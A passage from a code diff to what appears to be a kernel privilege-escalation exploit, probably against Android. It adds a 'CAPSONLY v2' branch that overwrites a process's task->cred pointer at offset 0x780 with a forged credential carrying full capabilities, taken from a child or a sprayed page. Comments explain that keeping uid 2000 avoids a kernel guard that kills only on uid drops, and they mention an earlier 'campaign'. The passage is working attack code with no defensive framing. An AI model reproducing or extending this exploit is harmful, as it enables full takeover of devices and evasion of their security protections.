@@ -419,7 +419,19 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
-        if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
+        if (env_flag("MODE4_CAPSONLY", 0) && g_child_cred) {
+          /* CAPSONLY v2: write task->cred (+0x780) = the CHILD's own
+           * caps-cred copy (uid=2000 + full caps). The child pins its
+           * page forever (polls own CapEff in MODE4_CAPS_CHILD), so the
+           * cred lifetime is guaranteed — campaign v1's parent-page cred
+           * had no lifetime guarantee for the child. */
+          g_main_pc = (uint64_t)g_child_cred;
+          g_main_left = (uint64_t)pselect_write_target();
+          pr_info("JC2 CAPSONLY v2: pc=%016llx (child caps-cred) "
+                  "left=%016llx (task+0x780)\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        } else if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
           /* diyiqiuye PFEM10 recipe: write task->cred (+0x780) = our
            * spray-page cred copy (uid=2000 + full caps). The guard only
            * kills on uid DROPS — uid stays 2000 → no kill. Caps give
